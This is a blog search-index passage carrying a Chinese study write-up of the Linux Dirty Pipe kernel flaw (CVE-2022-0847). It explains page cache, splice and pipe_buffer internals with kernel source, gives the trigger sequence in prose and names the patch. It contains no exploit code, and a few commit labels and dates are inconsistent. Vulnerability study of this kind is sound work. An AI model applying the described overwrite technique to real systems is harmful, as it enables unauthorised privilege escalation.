<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>The Dirty Pipe Vulnerability[学习记录]</title>
    <link href="/2022/04/10/The%20Dirty%20Pipe%20Vulnerability_%E5%A4%8D%E7%8E%B0/"/>
    <url>/2022/04/10/The%20Dirty%20Pipe%20Vulnerability_%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<blockquote><p>本人Web手，初探内核漏洞，不会GDB调，只能反复研读他人资料，拾人牙慧。</p><p>全文基本都是缝合他人的资料，以形成自己的理解逻辑。介意的请Ctrl+F4,或者跳转文末看相关参考链接</p></blockquote><h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><ul><li><strong>CVE编号</strong>：<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0847">CVE-2022-0847</a></li><li><strong>描述</strong>：在Linux内核中，新引入的管道缓冲区结构中的“flags”成员在<code>copy_page_to_iter_pipe</code>和<code>push_pipe函数</code>中缺少正确初始化，因此可能包含之前的值，这是一个问题。未经授权的本地用户可以使用此漏洞写入由只读文件支持的页面缓存中的页面，从而提升他们在系统上的权限。</li><li><strong>漏洞发现过程</strong>：<a href="https://dirtypipe.cm4all.com/">The Dirty Pipe Vulnerability -by Max Kellermann</a> 。<a href="https://corp0ra1.github.io/2022/03/15/The%20Dirty%20Pipe%20Vulnerability/">中文翻译版本 -by corp0ra1</a></li><li><strong>漏洞影响版本</strong>：5.8 &lt;= Linux内核版本 &lt; 5.16.11 / 5.15.25 / 5.10.102</li><li><strong>漏洞CVSS评分</strong>：7.8</li><li><strong>危害等级</strong>：高危</li><li><strong>修复方案</strong>：升级Linux内核到5.16.11、5.15.25、5.10.102及以上版本。</li></ul><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="Page和Page-Cache"><a href="#Page和Page-Cache" class="headerlink" title="Page和Page Cache"></a>Page和Page Cache</h2><p>CPU管理的最小内存单位是一个<code>页面(Page)</code>, 一个页面通常为4KB大小, Linux内存管理的最底层的一切都是关于页面的, 文件IO也是如此, 如果程序从文件中读取数据, 内核将先把它从磁盘读取到专属于内核的<code>页面缓存(Page Cache)</code>中, 后续再把它从内核区域复制到用户程序的内存空间中;</p><ol><li><strong>背景</strong>：磁盘的IO读写速度非常慢，所以通常在访问磁盘文件时，首先将其内容加载到物理内存中，然后再直接访问内存中的副本以读取数据。由于文件的内存拷贝，以后可能会被许多进程打开和使用。比如微信可能会打开本地文本，word软件也可能会打开相同的文本，使用副本就不用重复加载。</li><li><strong>解决方案</strong>：为了确保每个人都能快速访问，Linux设计了一种页面缓存机制来管理物理内存中映射的页面帧。如果用户进程使用读/写来读写文件，内核将首先将加载数据的物理内存映射到内核虚拟内存缓冲区。然后将内核缓冲区数据复制到用户模式。<br> <img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled.png"></li><li><strong>管道与界面缓存</strong>：不仅文件使用Page Cache，管道也使用Page Cache。在内核中，pipe的数据结构管理如下：pipe有一个大小为16的环形缓冲区数组，其中存储16个pipe_buf结构，每个pipe_buf结构都有一个指向表示物理内存页的结构的指针。每个页面的大小为4KB（不是连续存储）。<br> <img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%201.png">  </li></ol><h2 id="splice和零拷贝"><a href="#splice和零拷贝" class="headerlink" title="splice和零拷贝"></a>splice和零拷贝</h2><ol><li>背景：每一次都把文件数据从内核空间拷贝到用户空间, 将会拖慢系统的运行速度, 也会额外消耗很多内存空间</li><li>零拷贝技术：如果追求效率，内核还提供零拷贝模式（无系统调用，跨用户和内核边界切换上下文）:通过mmap方法，将文件映射到用户进程虚拟内存空间，代替<code>read/write/ioctl</code>的访问方式，此时内存拷贝过程只有“用户空间到虚拟内存空间”，省去了“用户到内核”的拷贝过程，在数据量大的情况下能显著提升读写效率。</li><li>splice()与零拷贝技术：Linux 2.6.17新加入的系统调用<code>splice()</code>,用于在两个文件间移动数据，而无需内核态和用户态的内存拷贝，但需要借助管道实现。<ol><li>解释一：splice在实现上，使用指向管道缓存页的指针指向文件缓存页(前文提及“不仅文件使用Page Cache，管道也使用Page Cache”)</li><li>解释二：目标文件的页面缓存数据不会直接复制到Pipe的环形缓冲区内, 而是以索引的方式(即 内存页框地址、偏移量、长度 所表示的一块内存区域)复制到了pipe_buffer的结构体中, 如此就避免了从内核空间向用户空间的数据拷贝过程, 所以被称为”零拷贝”;</li><li>解释三：通过pipe buffer实现一组内核内存页（pages of kernel memory）的引用计数指针（reference-countedpointers），数据拷贝过程中并不真正拷贝数据，而是创建一个新的指向内存页的指针。也就是说拷贝过程实质是指针的拷贝，称为零拷贝技术。</li></ol></li><li>补充：splice底层实现，校验了file的读属性，但是没有校验写权限→漏洞产生原因之一</li><li>splice()函数的定义，如下图，内容源自：<a href="https://man7.org/linux/man-pages/man2/splice.2.html">splice(2) — Linux manual page</a><br> <img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%202.png"></li></ol><h2 id="pipe相关"><a href="#pipe相关" class="headerlink" title="pipe相关"></a>pipe相关</h2><h3 id="pipe"><a href="#pipe" class="headerlink" title="pipe"></a>pipe</h3><ol><li>概念：管道(Pipe)是一个程序向另一个程序发送数据的一种方式, </li><li>目的：将管道视为一个程序无需先将其写入磁盘即可与另一个程序对话的一种方式，这通常会加快程序速度。</li><li>特点：它包含一个输入端和一个输出端, 程序将数据从一段输入, 从另一端读出; 在内核中, 为了实现这种数据通信, 需要以页面(Page)为单位维护一个<code>环形缓冲区</code>(pipe_buffer), 它通常最多包含16个页面, 且可以被循环利用;</li></ol><h3 id="pipe-buffer的merge操作"><a href="#pipe-buffer的merge操作" class="headerlink" title="pipe buffer的merge操作"></a>pipe buffer的merge操作</h3><ol><li>背景：当一个程序使用管道写入数据时, pipe_write()调用会处理数据写入工作, 默认情况下, 多次写入操作是要写入环形缓冲区的一个新的页面的, 但是如果单次写入操作没有写满一个页面大小, 就会造成内存空间的浪费</li><li>解决方案：pipe_buffer中的每一个页面都包含一个<code>can_merge</code>属性, 该属性可以在下一次pipe_write()操作执行时, 指示内核继续向同一个页面继续写入数据, 而不是获取一个新的页面进行写入</li></ol><h3 id="pipe-buffer"><a href="#pipe-buffer" class="headerlink" title="pipe_buffer"></a>pipe_buffer</h3><ol><li>为什么了解这部分？pipe靠pipe_bufffer来管理page。<br><img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%203.png"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">//https://github.com/torvalds/linux/blob/v5.8/include/linux/pipe_fs_i.h#L57</span><br><br><span class="hljs-comment">//struct pipe_inode_info - a linux kernel pipe  为一个环形队列</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">bufs</span>;</span>   <span class="hljs-comment">//指向pipe_buffer的指针</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">tmp_page</span>;</span> <span class="hljs-comment">//为临时申请的界面</span><br><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> head;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> tail; <br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> max_usage;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> ring_size; <span class="hljs-comment">//为环形结构队列</span><br>…… ……<br>&#125;<br><br><span class="hljs-comment">//struct pipe_buffer - a linux kernel pipe buffer</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span> <span class="hljs-comment">//the page containing the data for the pipe buffer</span><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> offset, len;<br><span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span> <span class="hljs-comment">//pipe_buf的相关操作</span><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> flags; <span class="hljs-comment">//pipe buffer的flags.见下面</span><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">private</span>;<br>&#125;;<br><br><span class="hljs-comment">//默认的pipe_buffer为16个</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PIPE_DEF_BUFFERS16   </span><br><span class="hljs-comment">//pipe_buffer的flag</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PIPE_BUF_FLAG_GIFT0x04<span class="hljs-comment">/* page is a gift */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PIPE_BUF_FLAG_PACKET0x08<span class="hljs-comment">/* read() as a packet */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PIPE_BUF_FLAG_CAN_MERGE0x10<span class="hljs-comment">/* can merge buffers */</span></span><br></code></pre></td></tr></table></figure></li></ol><h3 id="pipe-buf-operations"><a href="#pipe-buf-operations" class="headerlink" title="pipe_buf_operations"></a>pipe_buf_operations</h3><p>说明：pipe_buf_operations只是个抽象，标识pipe_buffer的操作</p><p>为什么需要了解这部分？因为merge操作的时候涉及到匿名函数的判断</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">//https://github.com/torvalds/linux/blob/f6dd975583bd8ce088400648fd9819e4691c8958/fs/pipe.c#L93</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> &#123;</span><br><span class="hljs-comment">//-&gt;confirm()验证管道缓冲区中的数据是否存在以及内容是否良好。</span><br><span class="hljs-built_in"><span class="hljs-keyword">int</span></span> (*confirm)(struct pipe_inode_info *, struct pipe_buffer *);<br><span class="hljs-comment">//当此管道缓冲区的内容已被读取器完全使用时，将调用--&gt;release（）。</span><br><span class="hljs-built_in"><span class="hljs-keyword">void</span></span> (*release)(struct pipe_inode_info *, struct pipe_buffer *);<br><span class="hljs-comment">//尝试获取管道缓冲区及其内容的所有权。</span><br><span class="hljs-comment">//try_steal()返回true表示成功，在这种情况下，管道(buf-&gt;page)的内容被锁定，并且完全归调用者所有。</span><br><span class="hljs-comment">//页面可能会被转移到不同的映射，最常用的情况是插入到不同的文件地址空间缓存中。</span><br><span class="hljs-built_in"><span class="hljs-keyword">bool</span></span> (*try_steal)(struct pipe_inode_info *, struct pipe_buffer *);<br><span class="hljs-comment">//获取对管道缓冲区的引用。</span><br><span class="hljs-built_in"><span class="hljs-keyword">bool</span></span> (*get)(struct pipe_inode_info *, struct pipe_buffer *);<br>……………………<br>&#125;;<br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> <span class="hljs-title">anon_pipe_buf_ops</span> =</span> &#123;<br>.confirm = generic_pipe_buf_confirm,<br>.release = anon_pipe_buf_release,<br>.steal = anon_pipe_buf_steal,<br>.get = generic_pipe_buf_get,<br>&#125;;<br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> <span class="hljs-title">anon_pipe_buf_ops</span> =</span> &#123;<br>.release= anon_pipe_buf_release,<br>.try_steal= anon_pipe_buf_try_steal,<br>.get= generic_pipe_buf_get,<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">bool</span> <span class="hljs-title">anon_pipe_buf_try_steal</span><span class="hljs-params">(struct pipe_inode_info *pipe,struct pipe_buffer *buf)</span></span>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span> =</span> buf-&gt;page;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">page_count</span>(page) != <span class="hljs-number">1</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><span class="hljs-built_in">memcg_kmem_uncharge_page</span>(page, <span class="hljs-number">0</span>);<br>__SetPageLocked(page);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="漏洞理解"><a href="#漏洞理解" class="headerlink" title="漏洞理解"></a>漏洞理解</h1><h2 id="开发者视角：关于can-merge标志的变更"><a href="#开发者视角：关于can-merge标志的变更" class="headerlink" title="开发者视角：关于can_merge标志的变更"></a>开发者视角：关于can_merge标志的变更</h2><ol><li>很久之前， <code>struct pipe_buf_operations</code> 有一个flag为<code>can_merge</code>  。目的使pipe_buf可以合并并复用，以提高利用效率。</li><li><strong>Linux 2.6.16, 2006</strong>：<a href="https://github.com/torvalds/linux/commit/5274f052e7b3dbd81935772eb551dfd0325dfa9d">Commit 5274f052e7b3 “Introduce sys_splice() system call”</a> 。引入了<code>splice()</code>系统调用，同时引入了<code>page_cache_pipe_buf_ops</code>，这是一个<code>struct pipe_buf_operations</code>实现，用于pipe_buf来指向page cache。该结构体的第一个属性为<code>can_merge=0</code>（表示管道缓冲区不可合并）。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// fs/splice.c #L70</span><br><span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> <span class="hljs-title">page_cache_pipe_buf_ops</span> =</span> &#123;<br>.can_merge = <span class="hljs-number">0</span>,<br>.map = page_cache_pipe_buf_map,<br>.unmap = page_cache_pipe_buf_unmap,<br>.release = page_cache_pipe_buf_release,<br>&#125;;<br></code></pre></td></tr></table></figure></li><li><strong>Linux 5.1, 2019</strong>： <a href="https://github.com/torvalds/linux/commit/01e7187b41191376cee8bea8de9f907b001e87b4">Commit 01e7187b4119 “pipe: stop using -&gt;can_merge”</a>将can_merge的flag重构为与<code>struct pipe_buf_operations</code>指针比较的函数<code>pipe_buf_can_merge()</code><ol><li>原因：因为只有一种类型的管道缓冲区<code>anon_pipe_buf_ops</code> 可以设置此标志为1，其他类型的则为0。但考虑到<code>can_merge</code>字段在结构体中占一个int大小的空间，因此把判断能否merge的操作改为指针判断，将所有的<code>pipe_buf_operations</code>结构体中的<code>can_merge</code>属性删除（包括splice.c中引入<code>page_cache_pipe_buf_ops</code>中的can_merge属性）。函数换变量，时间换空间，合情合理。<br><img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%204.png"><br><img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%205.png"><br><img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%206.png"></li></ol></li><li><strong>Linux 5.8, 2020</strong>： <a href="https://github.com/torvalds/linux/commit/f6dd975583bd8ce088400648fd9819e4691c8958">Commit f6dd975583bd “pipe: merge anon_pipe_buf*_ops”</a>将判断merge与否的函数<code>pipe_buf_can_merge()</code> 重构为每个缓冲区flag<code>PIPE_BUF_FLAG_CAN_MERGE</code>.<br> 原因：<ol><li>因为这几个<code>pipe_buf_operations</code>类型的结构体的结构是相同的，只是通过结构体名次来区分packet和merge的行为而已，故考虑将之合并为一个结构体。</li><li>原本pipe_buf有一个flags属性来标记packet行为，那么可以通过复用该flags属性来区分packet和merge的行为</li><li>将函数又换回常量，但实现代码的简洁和原始操作的不变动。这个初衷也合理<br><img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%207.png">  </li></ol></li><li>总结can_merge的变换过程：从<code>pipe_buf_operations</code> 结构体中的属性，为了节省一个int的空间变为一个函数，再通过复用flags变量变成一个常量，每一步都合情合理。但是问题是：<ol><li>其他文件和其他函数中，使用了can_merge的部分的代码都发生相应改变了吗？→漏洞的原因：有个地方漏了</li><li>现在什么情况下会设置pipe_buffer的flag为can_merge→漏洞的触发点</li></ol></li></ol><h2 id="漏洞视角：copy-page-to-iter-pipe、page-cache-pipe-buf-ops和can-merge"><a href="#漏洞视角：copy-page-to-iter-pipe、page-cache-pipe-buf-ops和can-merge" class="headerlink" title="漏洞视角：copy_page_to_iter_pipe、page_cache_pipe_buf_ops和can_merge"></a>漏洞视角：copy_page_to_iter_pipe、page_cache_pipe_buf_ops和can_merge</h2><p>在can_merge变迁过程中被遗漏的函数<code>copy_page_to_iter_pipe()</code>，也是漏洞之因：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">//https://github.com/torvalds/linux/blob/241699cd72a8489c9446ae3910ddd243e9b9061b/lib/iov_iter.c#L339</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">size_t</span> <span class="hljs-title">copy_page_to_iter_pipe</span><span class="hljs-params">(struct page *page, <span class="hljs-keyword">size_t</span> offset, <span class="hljs-keyword">size_t</span> bytes,struct iov_iter *i)</span></span><br><span class="hljs-function"></span>&#123;<br><br>…… ……<br><span class="hljs-comment">//[1] 将pipe_buffer指向当前需要写入的页的指针指向文件的缓存页，并设置其他信息，完成初始化操作</span><br>buf-&gt;ops = &amp;page_cache_pipe_buf_ops;<br><span class="hljs-comment">//[2]  后续补丁是在此专门完成对pipe_buf中flag变量的初始化</span><br><span class="hljs-comment">//buf-&gt;flags = 0;</span><br><span class="hljs-built_in">get_page</span>(buf-&gt;page = page);<br>buf-&gt;offset = offset;<br>buf-&gt;len = bytes;<br>…… ……<br>&#125;<br></code></pre></td></tr></table></figure><ol><li>Linux 2.6.16, 2006：最早<code>can_merge</code>标识在<code>ops</code>即<code>pipe_buf_operations</code>结构体中。<ol><li><code>pipe_buf_operations</code>有多种类型，比如<code>anon_pipe_buf_ops</code> 和<code>page_cache_pipe_buf_ops，</code>但是此时只有<code>anon_pipe_buf_ops</code>结构体中的<code>can_merge</code>属性为1，其他<code>ops</code>中则为0。可以理解为“<code>anon_pipe_buf_ops</code>和<code>can_merge</code>是强关联的”</li></ol></li><li>Linux 4.9,2016时期，<a href="https://github.com/torvalds/linux/commit/241699cd72a8489c9446ae3910ddd243e9b9061b">commit 243e9b9061b “new iov_iter flavour: pipe-backed”</a>：添加了iov_iter对Pipe的支持，引入了<code>copy_page_to_iter_pipe()</code>与<code>push_pipe()</code>函数。<ol><li>此时执行完<code>copy_page_to_iter_pipe()</code>函数中的<code>buf-&gt;ops = &amp;page_cache_pipe_buf_ops</code>操作，pipe buffer的<code>can_merge</code>的属性会被初始化为0</li></ol></li><li>Linux 5.1, 2019： <a href="https://github.com/torvalds/linux/commit/01e7187b41191376cee8bea8de9f907b001e87b4">Commit 01e7187b4119 “pipe: stop using -&gt;can_merge”</a>将<code>can_merge</code>的flag转换为与<code>struct pipe_buf_operations</code>指针比较。<ol><li>此时执行完<code>buf-&gt;ops = &amp;page_cache_pipe_buf_ops</code>操作，pipe buffer的<code>can_merge</code>的属性会保留原属性，不会改变(<code>can_merge</code>属性已经被删除了)，引入了隐患</li><li>但是能否进行<code>can_merge</code>操作的判断是通过<code>pipe_buf_can_merge()</code>函数实现，而<code>pipe_buf_can_merge()</code>函数则是判断该<code>ops</code>是否为<code>anon_pipe_buf_ops</code> ，使得最终<code>can_merge</code>的判断还是和<code>anon_pipe_buf_ops</code>是强关联的。</li><li>即此时<code>page_cache_pipe_buf_ops</code>虽然没有<code>can_merge</code>属性，但其类型是非anon的，也能达到<code>can_merge=0</code>的效果，所以此时不会触发漏洞</li></ol></li><li>Linux 5.8, 2020： <a href="https://github.com/torvalds/linux/commit/f6dd975583bd8ce088400648fd9819e4691c8958">Commit f6dd975583bd “pipe: merge anon_pipe_buf*_ops”</a> 将<code>pipe_buf_can_merge()</code>函数中的指针比较转换为每个缓冲区的flag<code>PIPE_BUF_FLAG_CAN_MERGE</code><ol><li>此时的<code>anon_pipe_buf_ops</code>不能再与<code>can_merge</code>强关联，暴露了<code>page_cache_pipe_buf_ops</code> 中的<code>can_merge</code>属性是未改变的隐患，就造成了漏洞的产生</li></ol></li><li>漏洞的操作：<ol><li>先将pipe_buf的状态设置为<code>PIPE_BUF_FLAG_CAN_MERGE</code> </li><li>再通过<code>splice</code>函数调用<code>copy_page_to_iter_pipe</code>函数，此时将pipe_buf中当前需要写入的页的指针指向所打开的文件的缓存页，没有改变pipe_buf原来的can_merge属性(此属性最早本应将之置0的，但是由于数次改动，而没有做这步工作)</li><li>最后执行<code>pipe_write()</code>写入操作，向pipe_buf写入脏数据。此时由于pipe_buf指针指向所打开的文件缓存页，且pipe_buf设置了<code>PIPE_BUF_FLAG_CAN_MERGE</code> ，所以没有申请新的页，直接在当前打开的文件缓存页中写入内容，进而实现了该文件内容的篡改</li></ol></li><li>Linux 5.17,2021：<a href="https://github.com/torvalds/linux/commit/9d2231c5d74e13b2a0546fee6737ee4446017903">Commit  7ee4446017903  “lib/iov_iter: initialize “flags” in new pipe_buffer”</a>  : 在<code>copy_page_to_iter_pipe()</code>执行完<code>buf-&gt;ops = &amp;page_cache_pipe_buf_ops</code>后设置了flags的初始化<code>buf-&gt;flags = 0</code>，修复了漏洞</li></ol><h2 id="pipe-write函数分析"><a href="#pipe-write函数分析" class="headerlink" title="pipe_write函数分析"></a>pipe_write函数分析</h2><ol><li>为什么了解？除了其涉及到写操作外，还涉及到can_merge标志如何设置，如何判断界面是否可以merge</li><li>什么时候续写merge?当向管道中写入数据，如果①管道非空②写入的数据拼接在之前的数据后面长度不会超过一页的大小②设有<code>PIPE_BUF_FLAG_CAN_MERGE</code>的flag，则可以续写</li><li>什么时候会设置<code>PIPE_BUF_FLAG_CAN_MERGE</code>的flag?如果无法在上一页续写，则会申请一个新页，并且在非<code>O_DIRECT</code>直接的情况下，则会设置<code>PIPE_BUF_FLAG_CAN_MERGE</code>(默认都会设置这个)</li><li>详情见代码</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">//https://github.com/torvalds/linux/blob/5274f052e7b3dbd81935772eb551dfd0325dfa9d/fs/pipe.c#L236</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">ssize_t</span> <span class="hljs-title">pipe_write</span><span class="hljs-params">(struct kiocb *iocb, struct iov_iter *from)</span></span><br><span class="hljs-function"></span>&#123;<br>    ………………<br>    <span class="hljs-comment">//如果 pipe 读者的数量为 0，则向进程发送 SIGPIPE 信号，并返回 EPIPE 错误。</span><br>    <span class="hljs-keyword">if</span> (!pipe-&gt;readers) &#123;<br><span class="hljs-built_in">send_sig</span>(SIGPIPE, current, <span class="hljs-number">0</span>);<br>ret = -EPIPE;<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br>    ………………<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Only wake up if the pipe started out empty, since otherwise there should be no readers waiting.</span><br><span class="hljs-comment"> * If it wasn&#x27;t empty we try to merge new data into the last buffer.（ 如果不是空的，我们会尝试将新数据合并到最后一个缓冲区中）</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * That naturally merges small writes, but it also age-aligs the rest of the writes for large writes spanning multiple pages.</span><br><span class="hljs-comment"> */</span><br>head = pipe-&gt;head;<br>was_empty = <span class="hljs-built_in">pipe_empty</span>(head, pipe-&gt;tail);<span class="hljs-comment">//判断head和tail是否相等   </span><br>    <span class="hljs-comment">//按位与运算通常用来对某些位清0或保留某些位。例如把a的高八位清0保留低八位，可作a&amp;255运算(255的二进制数为0000000011111111)</span><br>    <span class="hljs-comment">//此处类似于mod 取余的作用：计算要写入的数据总大小是否是页帧大小的倍数，并将余数保存在 chars 变量中</span><br>chars = total_len &amp; (PAGE_SIZE<span class="hljs-number">-1</span>);<span class="hljs-comment">//size_t total_len = iov_iter_count(to         </span><br>        <br>  <span class="hljs-comment">//[1]如果管道非空且chars不为0，则尝试从当前最后一页接着写</span><br><span class="hljs-keyword">if</span> (chars &amp;&amp; !was_empty) &#123;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> mask = pipe-&gt;ring_size - <span 